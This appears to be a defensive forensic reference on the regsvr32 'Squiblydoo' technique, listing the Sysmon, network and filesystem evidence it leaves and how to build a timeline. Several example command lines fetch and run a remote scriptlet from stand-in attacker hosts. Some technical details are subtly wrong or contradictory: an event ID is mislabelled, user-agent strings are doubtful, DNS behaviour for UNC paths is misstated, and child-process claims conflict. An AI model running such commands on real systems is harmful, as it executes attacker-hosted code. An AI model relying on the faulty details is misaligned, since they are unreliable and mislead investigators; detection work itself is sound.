# LOLBins — regsvr32.exe — Target Evidence

What an operator running `regsvr32.exe /i:[URL] /s scrobj.dll` leaves on the victim host: process-execution records, network events, registry activity (if any), filesystem artifacts, and the exact evidence signatures needed to detect or investigate the intrusion.

## Contents
- [Process Creation — Sysmon and Security Events](#process-creation--sysmon-and-security-events)
- [Registry Activity](#registry-activity)
- [Filesystem and Artifact Cache](#filesystem-and-artifact-cache)
- [Network-Layer Artifacts](#network-layer-artifacts)
- [Windows Script Host Execution](#windows-script-host-execution)
- [Timeline Building](#timeline-building)

---

## Process Creation — Sysmon and Security Events

`regsvr32.exe` spawned directly from cmd.exe, PowerShell, or a macro generates a process-creation event (Sysmon Event ID 1 or Security Event ID 4688 with command-line auditing enabled).

| Event Details | Value | Notes |
|---|---|---|
| **Image** / **ParentImage** | `C:\Windows\System32\regsvr32.exe` or `C:\Windows\SysWOW64\regsvr32.exe` | The two legitimate install paths per LOLBAS. |
| **CommandLine** (Sysmon 1 or Security 4688) | `regsvr32.exe /i:http://198.51.100.7/payload.sct /s scrobj.dll` | The exact command that triggered the event — includes the URL (if HTTP/HTTPS). This is the **single strongest detection signal** for Squiblydoo, since the `/i:<URL>` argument shape is unambiguous. |
| **ParentImage** | `C:\Windows\System32\cmd.exe` or `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` | Common parents for an attacker-issued regsvr32 command. A macro in Excel/Word spawns `WINWORD.EXE` or `EXCEL.EXE` as the parent. |
| **User** | `NT AUTHORITY\SYSTEM`, `NT AUTHORITY\LOCAL SERVICE`, or a domain user | Depends on the context in which the command was issued. A macro runs as the logged-in user; a scheduled task or service may run as SYSTEM or a service account. |
| **Hashes** | Authenticode signature of `regsvr32.exe` (Windows-signed, file hash will match the legitimate binary) | Even if the operator renamed or relocated `regsvr32.exe`, the PE's own metadata (`OriginalFileName`, `InternalName`, code signature) will match Microsoft's published hash. |

**Event ID 1 (Sysmon) example:**
```
Process Create:
  UtcTime: 2026-08-12T14:32:45.123Z
  ProcessId: 3456
  Image: C:\Windows\System32\regsvr32.exe
  CommandLine: regsvr32.exe /i:http://attacker.com/payload.sct /s scrobj.dll
  ParentImage: C:\Windows\System32\cmd.exe
  ParentProcessId: 1234
  OriginalFileName: REGSVR32.EXE
  User: DOMAIN\attacker
```

**No child processes spawned by regsvr32.exe itself** — all script execution happens in-process (inside `regsvr32.exe`'s own address space). Any secondary payload execution (e.g., a spawned `cmd.exe` or `powershell.exe` from within the scriptlet's JScript/VBScript code) will show up as direct children of `regsvr32.exe`, not as grandchildren of the original cmd.exe/PowerShell that called regsvr32.

## Registry Activity

The Squiblydoo technique **does not write to the registry at all** — the scriptlet execution bypasses the entire COM self-registration path. This is a key evasion advantage: there are no `HKLM\SOFTWARE\Classes\CLSID\` entries, no `HKLM\SOFTWARE\Wow6432Node\Classes\`, and no audit trail in Event 13 (Registry Object Added/Modified) that normal DLL registration would generate.

**Real DLL registration (legitimate operation)** would write to:
- `HKLM\SOFTWARE\Classes\CLSID\{GUID}\` (or `Wow6432Node\` for 32-bit registration on 64-bit OS)
- `HKLM\SOFTWARE\Classes\TypeLib\{GUID}\`
- Related ProgID and interface entries

**Squiblydoo execution produces zero registry writes for this reason.**

If the operator's scriptlet code (the embedded JScript/VBScript inside the `.sct` file) itself *writes* to the registry (e.g., a stager that sets a persistence Run key), those writes will show up as regsvr32-initiated events, but they're from the scriptlet's own JScript logic, not from regsvr32's DLL-registration machinery.

## Filesystem and Artifact Cache

Squiblydoo is **fileless by design** — the scriptlet is fetched and executed entirely from memory. However, several artifacts can persist depending on operator behavior and the scriptlet's own code:

| Artifact | Location | Notes |
|---|---|---|
| **Cached scriptlet file** | Varies | If the operator explicitly saved the `.sct` to disk (rather than only fetching it in-memory), it lands wherever the scriptlet-generation tool wrote it — `%TEMP%`, `%USERPROFILE%\Downloads\`, `C:\Users\Public\`, etc. The `.sct` file itself is human-readable XML and contains the full embedded JScript/VBScript source code. |
| **Temporary files dropped by the scriptlet** | Varies, typically `%TEMP%`, `%APPDATA%\Local\Temp\` | The embedded JScript/VBScript can create temporary files (e.g., staging a payload, writing a stager to disk before execution). These depend on the scriptlet author's design, not regsvr32 itself. |
| **Alternate Data Stream (ADS)** | If the scriptlet was written to an ADS on an innocent-looking host file | The operator could save the `.sct` file to `C:\Users\Public\notes.txt:script` and then reference it via `/i:C:\Users\Public\notes.txt:script`. A normal `dir` wouldn't show the ADS content, but `dir /R` or forensic tools would recover it. |
| **MRU / Recent Files** | Shell shortcuts/MRU (Most Recently Used) may record `.sct` file references if Explorer was used | Low-confidence signal due to easy clearing, but worth checking during forensics. |
| **WER (Windows Error Reporting) crash dump** | If `regsvr32.exe` crashes, `C:\ProgramData\Microsoft\Windows\WER\ReportArchive\` | Unlikely in a clean attack, but if the scriptlet's JScript engine fails, a crash dump might preserve a memory snapshot. |

## Network-Layer Artifacts

For Squiblydoo with HTTP/HTTPS URL fetching (the most common variant):

| Artifact | Source | Notes |
|---|---|---|
| **HTTP/HTTPS outbound request** | Proxy logs, firewall logs, packet capture, network sensor (Zeek, Suricata) | A request for the scriptlet file (e.g., `GET /payload.sct HTTP/1.1`) with a `User-Agent` string of `RegSvcs/2.0` (Windows 7/8), `RegSvcs` (Windows 10/11), or similar. The destination URL is the **single strongest network-side signal**. |
| **DNS query** | Proxy log, DNS server log, Windows DNS client log (if Query Logging is enabled) | A DNS A/AAAA query for the domain part of the scriptlet URL (e.g., `attacker.com`) occurs just before the HTTP request. |
| **TLS handshake (if HTTPS)** | Packet capture, proxy logs, firewall logs | An SSL/TLS session to the destination host on port 443 (or alternate HTTPS port). The TLS ServerName (SNI) field carries the hostname. |
| **Response body** | Proxy logs (if configured to capture/log body content) | The actual `.sct` file content (XML with embedded JScript/VBScript) may be logged by proxies with deep-inspection capabilities. Detecting `.sct` in HTTP response bodies is a strong detection opportunity. |

**UNC path scriptlet** (`/i:\\attacker.com\share\payload.sct`) produces:
- SMB connection to the attacker's share (Event ID 5145 on the SMB server if audited, or Sysmon Event 3 showing the connection)
- No DNS query (direct IP or hostname already known)
- No HTTP/HTTPS events

**Local file scriptlet** (`/i:C:\Users\Public\payload.sct`) produces:
- No network events at all — the scriptlet is read from local disk

## Windows Script Host Execution

The embedded JScript or VBScript inside the `.sct` file is executed by the Windows Script Host (WSH) engine, which is hosted inside `regsvr32.exe`'s own process. This means:

| Event Source | Details | Notes |
|---|---|---|
| **Sysmon Event 7 (Image Loaded)** | `cscript.exe`, `wscript.exe`, or the script engine DLLs (`vbscript.dll`, `jscript.dll`) loaded into `regsvr32.exe` | A typical `regsvr32.exe` process should never load `jscript.dll` or `vbscript.dll`. The presence of these DLLs loaded into `regsvr32.exe` is a high-confidence detection signal. |
| **Sysmon Event 23 (File Create Stream Hash)** | Deprecated; largely replaced by Sysmon's behavior tracking, but older systems may generate these for the scriptlet file I/O | Low confidence due to deprecation. |
| **PowerShell execution (if the scriptlet spawns PowerShell)** | Process creation of `powershell.exe` with `regsvr32.exe` as parent | If the embedded JScript/VBScript calls `CreateObject("WScript.Shell").Exec("powershell.exe ...")`, a `powershell.exe` child appears with regsvr32 as the parent — a highly suspicious parent-child pair. |

## Timeline Building

A complete timeline of a Squiblydoo attack follows this sequence:

**1. Initial Access** (not regsvr32-specific)
- Macro execution (WINWORD.EXE/EXCEL.EXE process create event)
- Script drop via email/web (file creation event, or direct command execution)
- Interactive shell or RDP session start (logon events)

**2. Regsvr32 Invocation**
- **Sysmon 1 / Security 4688:** `regsvr32.exe /i:http://...` command-line event (timestamp T0)
- **DNS query** (if HTTPS): domain query from `svchost.exe` or `rundll32.exe` (network module), ~immediately before T0
- **Sysmon 3 / Security 5156:** Network connection from `regsvr32.exe` to the scriptlet-hosting server (timestamp T0+1-2 seconds)

**3. Scriptlet Execution**
- **Sysmon 7 (Image Loaded):** `jscript.dll` or `vbscript.dll` loaded into `regsvr32.exe` process (T0+1-5 seconds)
- **Sysmon 3:** If the embedded script initiates additional network connections (C2 checkin, secondary payload download), those appear as `regsvr32.exe` network events

**4. Secondary Payload Execution** (payload-dependent)
- **Sysmon 1:** Child process spawn (if the scriptlet's code runs `CreateObject("WScript.Shell").Run(...)`)
  - Examples: `cmd.exe`, `powershell.exe`, `rundll32.exe`, `mshta.exe`, etc. — all with `regsvr32.exe` as parent
- **Sysmon 3:** Network connections from secondary process (if payload is a C2 agent or stager)

**5. Remediation / Cleanup**
- File deletions or ADS cleanup (Sysmon 23 if configured)
- Process termination events (if the operator explicitly kills regsvr32 or secondary processes)

**Correlation across sources:**
- The URL in the regsvr32 command line is the **anchor**. Cross-correlate it with:
  - Proxy/firewall logs for the same destination URL and timestamp
  - DNS logs for the domain
  - C2 or attacker-infrastructure logs (if recovered) for the same request timing
  - Secondary payload logs (C2 agent startup, post-execution module loading) for signs the stager succeeded
